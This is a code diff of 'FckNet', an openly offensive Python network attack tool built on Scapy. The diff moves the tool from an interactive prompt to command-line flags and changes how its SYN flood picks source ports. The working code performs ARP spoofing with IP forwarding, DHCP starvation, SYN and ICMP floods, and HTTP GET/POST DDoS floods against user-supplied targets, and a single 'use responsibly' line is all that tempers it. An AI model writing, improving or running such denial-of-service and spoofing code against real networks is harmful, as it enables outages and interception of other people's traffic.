@@ -8,9 +8,10 @@ import socket
 import warnings
 import random
 import threading
-from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP, Raw, ICMP
+from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP, Raw, ICMP, RandShort
 import scapy.all as scapy
-import requests 
+import requests
+import argparse
 
 # ASCII Banner for the tool
 banner = """
@@ -19,21 +20,6 @@ banner = """
  / _\/ __| |/ //  \/ / _ \ __|
 / / | (__|   </ /\  /  __/ |_
 \/   \___|_|\_\_\ \/ \___|\__| ~ A1SBERG
-"""
-
-# Help banner to show applicable commands for FckNet
-help_banner = """
-Welcome to FckNet, where you can fck up networks according to your needs!!! 
-Here's the list of commands for Fcknet:
-- 'arp_spoof': Perform ARP Spoofing
-- 'dhcp_starv': Perform DHCP Starvation
-- 'net_scan': Perform Network Scanning
-- 'syn_flood': Perform SYN Flooding
-- 'icmp_flood': Perform ICMP Flooding
-- 'ddos_post': Perform DDoS POST Request
-- 'ddos_get': Perform DDoS GET Request
-- 'help' or 'h': List all the applicable commands for FckNet
-- 'exit' or 'quit': Terminate FckNet
 """
 
 # Suppress Scapy warnings
@@ -54,7 +40,7 @@ def check_if_root():
     If not, print a message and exit.
     """
     if os.geteuid() != 0:
-        print("Run as root, Idiot.")
+        print("[-] Run as root, Idiot.")
         exit()
 
 def validate_ip(ip):
@@ -235,26 +221,7 @@ def display_results(devices):
     for device in devices:
         print(f"{device['ip']}\t\t{device['mac']}\t\t{device['name']}")
 
-### SYN Flooding ###
-def generate_random_ip():
-    """
-    Generate a random IPv4 address.
-    Returns:
-        str: A randomly generated IPv4 address in the form 'X.X.X.X'
-        where each X is a number between 0 and 255
-    """
-    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-
-def generate_random_port():
-    """
-    Generate a random TCP/UDP port number.
-    Port numbers are chosen from the range of 1024 to 65535, which are
-    considered user-defined ports (also known as dynamic or private ports)
-    Returns:
-        int: A randomly generated port number between 1024 and 65535
-    """
-    return random.randint(1024, 65535)
-
+### SYN Flooding ##
 def send_syn_packets(target_ip, target_port, packet_rate, duration, stats):
     """
     Send SYN packets to a target IP and port to simulate a SYN flooding attack.
@@ -268,10 +235,8 @@ def send_syn_packets(target_ip, target_port, packet_rate, duration, stats):
     end_time = time.time() + duration
     while time.time() < end_time:
         try:
-            src_ip = generate_random_ip()
-            src_port = generate_random_port()
-            ip = IP(src=src_ip, dst=target_ip)
-            tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 65535))
+            ip = IP(dst=target_ip)
+            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
             payload = Raw(b"A"*1024)
             packet = ip/tcp/payload
             send(packet, verbose=0)
@@ -424,74 +389,93 @@ def start_get_flood(target_url, request_rate, num_threads, duration):
 
 def main():
     """
-    Main function to handle user inputs and execute the corresponding network attack.
+    Main function to handle parameters and execute the corresponding network attack.
     """
+    print(banner)
     setup_logging()
     check_if_root()
-    print(banner)
-    while True:
-        try: 
-            command = input("Fcknet> ").strip().lower()
-            if command == '':
-                continue
-            elif command == 'exit' or command == 'quit':
-                logging.info("Terminating FckNet...")
-                break
-            elif command == 'help' or command == 'h':
-                print(help_banner)
-            elif command == 'arp_spoof':
-                target_ip = input("Enter target IP for ARP Spoofing: ").strip()
-                spoof_ip = input("Enter spoof IP (usually router's IP): ").strip()
-                if validate_ip(target_ip) and validate_ip(spoof_ip):
-                    enable_ip_forwarding()
-                    while True:
-                        arp_spoof(target_ip, spoof_ip)
-                        time.sleep(1)
-                else:
-                    logging.error("Invalid IP addresses.")
-            elif command == 'dhcp_starv':
-                interface = input("Enter network interface (e.g., eth0, wlan0): ").strip()
-                send_dhcp_discover(interface)
-            elif command == 'net_scan':
-                ip_range = input("Enter IP range to scan (e.g., 192.168.1.1/24): ").strip()
-                devices = scan_network(ip_range)
-                display_results(devices)
-            elif command == 'syn_flood':
-                target_ip = input("Enter target IP for SYN Flood: ").strip()
-                if not validate_ip(target_ip):
-                    print("Invalid IP address format!")
-                    continue
-                target_port = int(input("Enter target port for SYN Flood: ").strip())
-                packet_rate = int(input("Enter packets per second: ").strip())
-                threads = int(input("Enter number of threads: ").strip())
-                duration = int(input("Enter duration in seconds: ").strip())
-                start_syn_flood(target_ip, target_port, packet_rate, threads, duration)
-            elif command == 'icmp_flood':
-                target_ip = input("Enter target IP for ICMP Flood: ").strip()
-                if not validate_ip(target_ip):
-                    print("Invalid IP address format!")
-                    continue
-                packet_rate = int(input("Enter packets per second: ").strip())
-                num_threads = int(input("Enter number of threads: ").strip())
-                duration = int(input("Enter duration in seconds: ").strip())
-                start_icmp_flood(target_ip, packet_rate, num_threads, duration)
-            elif command == 'ddos_post':
-                url = input("Enter the target URL: ").strip()
-                packet_rate = float(input("Enter packets per second: ").strip())
-                packet_size = int(input("Enter the size of data (bytes) per packet: ").strip())
-                threads = int(input("Enter the number of threads: ").strip())
-                duration = int(input("Enter the duration in seconds: ").strip())
-                start_post_flood(url, packet_rate, packet_size, threads, duration)
-            elif command == 'ddos_get':
-                url = input("Enter the target URL: ").strip()
-                packet_rate = float(input("Enter packets per second: ").strip())
-                threads = int(input("Enter the number of threads: ").strip())
-                duration = int(input("Enter the duration in seconds: ").strip())
-                start_get_flood(url, packet_rate, threads, duration)
-            else:
-                logging.warning("Invalid command, type 'help' for options.")
-        except KeyboardInterrupt:
-            break
-
+    parser = argparse.ArgumentParser(
+    description=(
+        'FckNet is an advanced network manipulation tool tailored for various network attacks. '
+        'FckNet can perform ARP Spoofing, DHCP Starvation, and lots of Denial-of-Service Attacks. '
+        'USE RESPONSIBLY and ENSURE PROPER AUTHORIZATION when testing networks.'
+    )
+)
+    parser.add_argument('-a', '--action', type=str, help='Command to execute')
+    parser.add_argument('-ip', '--target-ip', type=str, help='Target IP address for the attack')
+    parser.add_argument('-sip', '--spoof-ip', type=str, help='IP address to spoof (for ARP Spoofing)')
+    parser.add_argument('-i', '--interface', type=str, help='Network interface to use')
+    parser.add_argument('-r', '--ip-range', type=str, help='Range of the Target IP (for Network Scan)')
+    parser.add_argument('-p', '--target-port', type=int, help="Port to SYN Flood")
+    parser.add_argument('-pr', '--packet-rate', type=int, default=100, help='Packet rate for flooding (default: 100 packets/sec)')
+    parser.add_argument('-d', '--duration', type=int, default=100, help='Duration for flooding in seconds (default: 100 seconds)')
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use for flooding (default: 10)')
+    parser.add_argument('-u', '--url', type=str, help="URL to DDoS for GET and POST Flood")
+    parser.add_argument('-psize', '--packet-size', type=int, default=100000, help="Packet size per request For POST and GET DDoS (default: 100000)")
+    args = parser.parse_args()
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+    if args.action == 'arp_spoof':
+        if not args.target_ip:
+            print("[-] Specify the Target IP")
+            return
+        if not args.spoof_ip:
+            print("[-] Specify the Spoof IP (Router)")
+            return
+        if validate_ip(args.target_ip) and validate_ip(args.spoof_ip):
+            enable_ip_forwarding()
+            while True:
+                arp_spoof(args.target_ip, args.spoof_ip)
+                time.sleep(1)
+        else:
+            print("[-] Invalid IP Address.")
+    elif args.action == 'dhcp_starv':
+        if not args.interface:
+            print("[-] Specify the interface (e.g, eth0)")
+            return
+        send_dhcp_discover(args.interface)
+    elif args.action == 'net_scan':
+        if not args.ip_range:
+            print("[-] Specify the IP Range (e.g, 192.168.32.0/24)")
+            return
+        devices = scan_network(args.ip_range)
+        display_results(devices)
+    elif args.action == 'syn_flood':
+        if not args.target_ip:
+            print("[-] Specify the Target IP")
+            return
+        if not args.target_port:
+            print("[-] Specify the Target Port")
+            return
+        if not validate_ip(args.target_ip):
+            print("[-] Invalid IP Address")
+            return
+        start_syn_flood(args.target_ip, args.target_port, args.packet_rate, args.threads, args.duration)
+    elif args.action == 'icmp_flood':
+        if not args.target_ip:
+            print("[-] Specify the Target IP")
+            return
+        if not validate_ip(args.target_ip):
+            print("[-] Invalid IP Address")
+            return
+        start_icmp_flood(args.target_ip, args.packet_rate, args.threads, args.duration)
+    elif args.action == 'ddos_post':
+        if not args.url:
+            print("[-] Specify the URL")
+            return
+        start_post_flood(args.url, args.packet_rate, args.packet_size, args.threads, args.duration)
+    elif args.action == 'ddos_get':
+        if not args.url:
+            print("[-] Specify the URL")
+            return
+        start_get_flood(args.url, args.packet_rate, args.threads, args.duration)
+    elif args.action != ['arp_spoof', 'dhcp_starv', 'net_scan', 'syn_flood', 'icmp_flood', 'ddos_post', 'ddos_get']:
+        print("[-] Invalid action")
+        return
+    else:
+        print("[-] Please specify an action")
+        return
+        
 if __name__ == "__main__":
     main()
